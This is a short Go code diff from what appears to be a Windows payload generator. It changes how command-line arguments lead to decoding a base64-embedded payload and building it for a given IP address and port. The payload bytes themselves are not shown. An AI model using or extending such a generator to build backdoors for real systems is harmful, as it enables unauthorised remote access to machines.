@@ -81,12 +81,10 @@ func main() { // 192.168.1.1 8888 -p windows -a x86 -l static
   }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
     color.Red("\n[-] ERROR : Invalid Payload !")
     os.Exit(1)
+  }else {
+  	WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
+  	GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
   }
-
-  if len(ARGS) == 2 {
-  	 GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(WINDOWS_PAYLOAD), ARC, LINKER)
-  }
-
 
 
   color.Blue("\n\n[*] Payload : "+PAYLOAD)
